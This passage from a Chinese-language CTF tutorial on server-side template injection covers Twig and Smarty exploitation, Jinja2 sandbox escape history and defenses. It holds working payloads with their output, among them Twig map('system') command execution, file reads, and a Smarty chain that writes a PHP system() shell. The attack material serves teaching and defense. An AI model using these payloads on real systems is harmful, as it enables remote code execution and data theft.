> 沙箱历史上破过两次，都与"借道格式化字符串"有关：3.1.5 之前，`str.format` 的检测可以绕过（CVE-2024-56326，3.1.5 修复）；3.1.6 之前，attr 过滤器配合格式化字符串能拿到未经检查的属性（CVE-2025-27516，3.1.6 修复）。本章按 3.1.6 记录，两条公开逃逸思路的结果就是上面第五条输出那样的空串——打不动。遇到运行在 3.1.4 及更早版本的靶子，格式化字符串逃逸是真实可用的；判断目标 jinja2 版本属于信息收集的一部分。另一个方向的思路是找沙箱**没拦**的对象：is_safe_attribute 拒绝的是下划线开头的属性名，若上下文里存在某个公开属性恰好指向可执行对象（应用代码自己暴露的对象），沙箱不拦它——这类逃逸依赖具体应用暴露了什么，没有通用 payload。

> [!note] 沙箱不是修法
> 第 8 节会展开：沙箱是"模板内容不可信"场景下的减损措施，正确修法仍然是别让用户输入进模板源码。沙箱会被绕过（历史上破过两次，未来还可能），==把它当唯一防线，等于把安全寄托在引擎版本的时效上==。

## 7. Twig 与 Smarty 速览

PHP 侧两个主流引擎：Twig（Symfony 系）与 Smarty（老牌独立引擎）。装法：`apt-get install -y php-twig smarty4`（或用 composer 装项目对应版本）。3.1 的探测脚本在这里全部适用，本节只补利用与版本现状。

### 7.1 Twig：map 与 filter

Twig 3 的模板里，`map`、`filter` 过滤器接受回调，回调名写成字符串时按 PHP 函数名调用——函数名可控就是任意函数调用：

```bash
echo 'flag{tw1g_m4p_r3ad}' > /tmp/w09_twig_flag.txt
php twig_t.php "{{['/tmp/w09_twig_flag.txt']|map('file_get_contents')|join}}"
```

输出：

```
Hello flag{tw1g_m4p_r3ad}
!
```

`['路径']` 是单元素数组，`map('file_get_contents')` 对每个元素调用该函数，`join` 把结果数组拼成字符串。读文件干净利落；执行命令用 `map('system')`——注意 PHP 的 `system` 自己就把输出打到响应里，返回值是输出的最后一行，两者会各出现一次：

```bash
php twig_t.php "{{['id -un']|map('system')|join}}"
```

输出：

```
Hello hua
hua!
```

第一个 `hua` 是 `system` 透传的命令输出，第二个是 `join` 拼的返回值——重复不重复不影响"执行成功"的判定。`filter` 过滤器同样能接 `'system'`，行为相近。

老题解里 Twig 的第一 payload 是 `_self` 链：`{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`——给引擎注册"未定义过滤器"回调，再触发一次过滤器查找，回调（`exec`）就被执行。这条链在本文的 Twig 3.23 上打不动，看两发对照：

```bash
php twig_t.php '{{_self}}'
php twig_t.php '{{_self.env.registerUndefinedFilterCallback("exec")}}'
```

输出：

```
Hello __string_template__56a02d2c56c0d31d89d2491e95c2623e!
```

```
[error] Twig\Error\RuntimeError: Macro "env" is not defined in template "__string_template__9da793ea2588b74d161b621284de5682" in "__string_template__9da793ea2588b74d161b621284de5682" at line 1.
```

`{{_self}}` 渲染出的是**模板名字符串**，不是模板对象——`_self.env` 自然无路可走，报错也印证了这一点。这条 payload 流行于 Twig 2.x 时代的题解，遇到能直接命中它的靶子，说明引擎相当老；新版本上用 `map`、`filter` 系。 Twig 的语法错误会直接把模板片段和位置报出来，识别与调 payload 时都省事：

```bash
php twig_t.php '{{7*}}'
```

输出：

```
[error] Twig\Error\SyntaxError: Unexpected token "end of print statement" of value "" in "__string_template__967b743673a8021d021dbe3557bf93e0" at line 1.
```

### 7.2 Smarty：php 标签的废弃与现状

Smarty 的利用史集中在 `{php}` 标签：它曾允许模板里直接写 PHP 代码，SSTI 一旦成立等于直接拿到代码执行。这个标签在 Smarty 3.1 起被移除，现在的主流版本（4.x、5.x）一律拒绝：

```bash
php smarty_t.php '{php} echo 1; {/php}'
```

输出：

```
[error] SmartyCompilerException: Syntax error in template "eval:{php} echo 1; {/php}"  on line 1 "{php} echo 1; {/php}" unknown tag 'php'
```

`unknown tag 'php'` 就是版本现状的直接证据。Smarty 3 时代的另一类 payload 借静态方法调用执行代码，代表是一条用 `Smarty_Internal_Write_File::writeFile` 写 PHP 文件的链；在新版本上，模板里的静态类调用默认被安全策略拦下：

```bash
php smarty_t.php "{Smarty_Internal_Write_File::writeFile(\$SCRIPT_NAME,\"<?php system('id -un'); ?>\",self::clearConfig())}"
```

输出：

```
[error] SmartyCompilerException: Syntax error in template "eval:{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id -un'); ?>",self::clearConfig())}"  on line 1 "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id -un'); ?>",self::clearConfig())}" static class 'self' is undefined or not allowed by security setting
```

==Smarty 的现状：识别容易、直接执行难，主流版本上更多走"信息泄露 + 版本特性"路线==。识别相关的三件事在 3.1 节都已给出：`{$smarty.version}` 报版本号、`{7*7}` 求值得 49、`${7*7}` 得 `$49`。补一个语法层面的说明：`{literal}` 标签让定界符内内容原样输出，前端模板里包裹 JS 花括号靠它；遇到它也意味着渲染端是 Smarty：

```bash
php smarty_t.php '{literal}{{7*7}}{/literal}'
```

输出：

```
{{7*7}}
```

`{{7*7}}` 原样出现——在 Smarty 这里它不是语法，只是 `{literal}` 包着的文本。

## 8. 防御视角

### 8.1 模板与数据分离

正解就是第 1 节那条对照的右列：==模板是代码里写死的常量，用户输入只从变量参数进去==。给第 2 节的靶补一个防御路由：

```python
@app.get("/safe")
def safe():
    name = request.args.get("name", "guest")
    return render_template_string("<h2>Hello {{ name }}!</h2>", name=name)
```

输入作为**变量值**渲染，模板引擎对值只做文本插入，不编译：

```bash
curl -sG --noproxy '*' --data-urlencode 'name=CTF' 'http://127.0.0.1:8901/safe'
curl -sG --noproxy '*' --data-urlencode 'name={{7*7}}' 'http://127.0.0.1:8901/safe'
curl -sG --noproxy '*' --data-urlencode "name={{ lipsum.__globals__['os'].popen('cat flag.txt').read() }}" 'http://127.0.0.1:8901/safe'
```

输出：

```
<h2>Hello CTF!</h2>
```

```
<h2>Hello {{7*7}}!</h2>
```

```
<h2>Hello {{ lipsum.__globals__[&#39;os&#39;].popen(&#39;cat flag.txt&#39;).read() }}!</h2>
```

`{{7*7}}` 原样显示、整条利用链原样显示——不是被过滤拦下，是压根没被当语法。这与 [[W05-命令注入与代码执行|W05]] 的 escapeshellarg 是同一个思想在不同入口的落点：==参数永远是参数==。

应用确实需要"按名字选模板"时，用**预定义映射**而不是拼接：

```python
TEMPLATES = {
    "welcome": "<h2>Welcome, {{ name }}!</h2>",
    "goodbye": "<h2>Goodbye, {{ name }}!</h2>",
}
render_template_string(TEMPLATES[kind], name=name)
```

`kind` 只允许在固定键里挑，模板串永远出自代码，拼接面不存在。

### 8.2 沙箱与最小拼接面

模板内容不得不动态（用户自定义模板产品）时，叠加两层：

- **SandboxedEnvironment**（第 6 节）：拦住属性链，把模板语法能触及的面压到"表达文本"所需的最小集；
- **语法最小化**：按需裁剪——只允许占位符替换的场景直接用 `string.Template`（`$name` 语法，没有表达式能力）；必须用 jinja2 时考虑关闭不必要的扩展、自定义 `is_safe_attribute` 进一步收紧。

运维侧两条配套：**关掉 debug 模式**（debug 页的交互式控制台本身就是代码执行入口，第 4、5 节那些 500 在 debug 下会变成 Python 控制台）与**不留调试靶**（生产环境不部署带拼接的临时页面）。三层各管一段：==分离取消拼接面，沙箱压缩触及面，运维收敛暴露面==。

## 9. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| `{{7*7}}` 原样出现在页面上 | 输入没进模板源码：可能拼进了变量值、属性或前端模板；换注入点再探（[[#1. 注入边界：进模板源码，还是进变量\|第 1 节]]） |
| 49 出来了，后续 payload 直接 500 | 链条某段对 Undefined 或越界下标继续操作，求值期抛异常：逐段核对——先打 `{{ ''.__class__ }}`，通了再加一级；对照服务端日志定位断点（[[#4. Jinja2 利用阶梯\|第 4 节]]） |
| 类链下标 payload 换个靶就失效 | 子类清单随进程加载的模块变化，下标不是常数：用 `{% for %}` 探针现数（[[#4. Jinja2 利用阶梯\|第 4 节]] 4.2） |
| 输出里满是 `&lt;` `&#39;` | Flask 默认对 render_template_string 开 HTML 转义，只影响显示不影响求值：flag 等不含特殊字符的输出照常完整 |
| payload 里 URL 一发就断 | `{{ }}`、引号、空格没编码：curl 换 `-G --data-urlencode` 形式，URL 单引号包住（本章实验约定） |
| request.args 技巧完全无效 | 上下文里没有 request：裸 jinja2 靶没有这个对象，换该框架注入的上下文对象或改走 config、lipsum 等入口（[[#5.1 下划线被滤：attr 过滤器与 request 变量\|5.1]]） |
| 引号、点同时被滤后无从下手 | request 本身也要走 attr 链（[[#5.2 点被滤：attr 链\|5.2]] 变体）；四类全禁时才需要字符串拼装技巧（[[#5.4 引号被滤：字符串全部走参数\|5.4]] 折叠框） |
| Twig 靶上 `_self` 链报 Macro "env" is not defined | `_self` 在新版本 Twig 里是模板名字符串：改用 map、filter 系 payload（[[#7.1 Twig：map 与 filter\|7.1]]） |
| Smarty 和 jinja2 分不清 | `{{7*7}}` 在 Smarty 是字面文本，`{7*7}` 才是 49：单双花括号结果对照（[[#3. 引擎识别\|第 3 节]]） |
| Smarty 靶上老 payload 报 unknown tag 或 security setting | `{php}` 3.1 起移除、静态类调用默认被拦：按版本现状选路线，老 payload 只在老版本成立（[[#7.2 Smarty：php 标签的废弃与现状\|7.2]]） |
| 沙箱靶 payload 静默变空、不报错 | 被拦的属性访问返回特殊 Undefined，打印即空串；继续链用才抛 SecurityError——静默不等于执行成功（[[#6. 沙箱逃逸入门\|第 6 节]]） |
| pop 写法第二次请求开始全 500 | pop 从字典里删了键、从清单里删了类，破坏现场：换 `__getitem__`，或重启靶再调（[[#5. 过滤绕过\|第 5 节]] 5.3） |

## 10. 配套练习与延伸阅读

> [!note] 实战任务
> 1. **CTFshow Web 入门**的 SSTI 题（[[01-练习平台索引|01 章]]收录获取方式）：任选一题，按"探测 → 识别 → 阶梯 → 绕过"的完整流程打到 flag，写清每一步的输出依据。至少一题要求命中非 49 的识别分支。
> 2. **PayloadsAllTheThings 的 SSTI 篇**：挑一个本章没展开的引擎（Mako、Freemarker、ERB 任选），读懂它一条执行链的每一段，用本章 3.1 的探测脚本方法给该引擎搭一个本地最小靶。

配套练习：

1. 给第 2 节的靶加一条"点与下划线同时过滤"的路由，用 5.2 变体的思路打通并读出 flag；把每一步的 payload 差异记成对照表。
2. 把 4.2 的 `{% for %}` 探针封装成脚本：输入类名，自动数出下标并拼出完整类链 payload，在两个不同进程的靶上各跑一遍，观察下标差异。
3. 沙箱靶上试验 `is_safe_attribute` 的收紧方向：继承 SandboxedEnvironment、重写该方法把公开属性也纳入白名单，用第 6 节的五条 payload 加 `{{ 'abc'.upper() }}` 检查拦截面的变化。
4. Twig 靶上把 `map('file_get_contents')` 换成读 `/etc/passwd`，再写一条 `filter('system')` 版执行命令 payload，对照输出形态与 7.1 的差异。
5. 防御回归：把第 2 节靶的漏洞路由按 8.1 改成参数化写法，重放第 4 节全部 payload，确认输出全部为原样字面量。

延伸阅读：

- jinja2 官方文档的 Sandbox 一节（palletsprojects.com）：`is_safe_attribute`、`intercepted_binops` 等定制点的权威说明，第 6 节机制描述的出处；
- Twig 与 Smarty 官方文档：定界符、过滤器、安全策略（`static class` 限制）的原文；
- PortSwigger Web Security Academy 的 Server-side template injection 词条（portswigger.net）：决策树探测法的原始出处；
- PayloadsAllTheThings 仓库的 SSTI 篇：各引擎 payload 的百科式索引，本章识别表与折叠框的扩展阅读；
- 自动化工具 tplmap 能对多数引擎做探测与利用（[[03-工具清单|03 章]]有收录）：用法同 sqlmap 的定位——==先手工确认注入点与引擎，再交给工具放大==；
- 下一站：[[W10-SSRF|W10]]——同样是"输入决定服务器行为"，这次服务器替你发请求；执行类漏洞的家族对照可回看 [[W05-命令注入与代码执行|W05]] 与 [[W12-PHP反序列化|W12]]。
